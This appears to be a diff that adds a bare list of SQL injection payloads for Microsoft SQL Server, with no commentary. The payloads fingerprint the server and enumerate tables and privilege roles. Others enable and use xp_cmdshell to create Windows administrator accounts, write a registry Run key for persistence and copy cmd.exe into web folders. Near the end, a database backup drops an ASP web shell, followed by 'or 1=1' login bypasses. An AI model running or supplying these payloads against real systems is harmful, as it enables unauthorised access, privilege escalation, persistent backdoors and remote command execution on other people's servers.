@@ -1,0 +1,44 @@
+and db_name()>0
+and user>0
+and 1=(select @@VERSION) 或and 1=convert(int,@@version)--
+and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = 'X' AND name ='xp_cmdshell')
+;exec master.dbo.sp_addextendedproc 'xp_cmdshell','e:\inetput\web\xplog70.dll';--
+;EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\
+Run','help1','REG_SZ','cmd.exe /c net user test ptlove /add'
+;exec master.dbo.xp_cmdshell "copy c:\winnt\system32\cmd.exe   c:\inetpub\scripts\cmd.exe"
+;insert temp exec master.dbo.xp_availablemedia;
+;insert into temp(id) exec master.dbo.xp_subdirs 'c:\';--
+;insert into temp(id) exec master.dbo.xp_cmdshell 'type c:\web\index.asp';--
+;bulk insert temp(id) from 'c:\inetpub\wwwroot\index.asp'
+;delete from temp;--
+and (select top 1 id from TestDB.dbo.temp)>0
+and (select count(*) from master.dbo.sysdatabases where name>1 and dbid=6) <>0
+and (select count(*) from TestDB.dbo.user)>0
+and 1=(SELECT IS_SRVROLEMEMBER('sysadmin'))
+'sa'=(SELECT System_user)
+;use model--
+and 0<>(select count(*) from master.dbo.sysdatabases where name>1 and dbid=6)--
+and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 )>0
+and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 and name not in('xyz'))>0
+and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 and name not in('xyz',''))>0
+and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 and name not in('xyz','',''))>0
+and 1=(SELECT IS_SRVROLEMEMBER('sysadmin'));--
+and 1=(SELECT IS_SRVROLEMEMBER('serveradmin'));--
+and 1=(SELECT IS_SRVROLEMEMBER('setupadmin'));--
+and 1=(SELECT IS_SRVROLEMEMBER('securityadmin'));--
+and 1=(SELECT IS_SRVROLEMEMBER('diskadmin'));--
+and 1=(SELECT IS_SRVROLEMEMBER('bulkadmin'));--
+and 1=(SELECT IS_MEMBER('db_owner'));--
+;exec master.dbo.sp_addlogin username;--
+;exec master.dbo.sp_password null,username,password;--
+;exec master.dbo.sp_addsrvrolemember sysadmin username;--
+;exec master.dbo.xp_cmdshell 'net user username password /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add';--
+;exec master.dbo.xp_cmdshell 'net user username password /add';--
+;exec master.dbo.xp_cmdshell 'net localgroup administrators username /add';--
+use model
+create table cmd(str image);
+insert into cmd(str) values ('<%=server.createobject("wscript.shell").exec("cmd.exe /c "&request("c")).stdout.readall%>');
+backup database model to disk='g:\wwwtest\l.asp';
+' or 1=1
+" or 1=1
+or 1=1
